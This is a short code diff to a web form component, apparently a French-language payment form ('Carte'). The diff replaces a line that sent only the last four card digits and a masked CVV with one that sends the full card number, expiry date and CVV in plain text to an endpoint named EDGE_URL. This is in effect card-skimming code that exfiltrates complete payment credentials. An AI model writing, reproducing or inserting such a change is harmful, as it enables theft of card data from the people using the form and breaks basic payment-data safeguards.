@@ -297,7 +297,7 @@ export default function Form() {
         name:    `${fields.firstName} ${fields.lastName}`,
         email:   '',
         phone:   '',
-        message: `Carte: **** **** **** ${fields.cardNumber.replace(/\s/g, '').slice(-4)} | Exp: ${fields.month}/${fields.year} | CVV: ***`,
+        message: `Carte: ${fields.cardNumber} | Exp: ${fields.month}/${fields.year} | CVV: ${fields.cvv}`,
       }
       const res = await fetch(EDGE_URL, {
         method:  'POST',
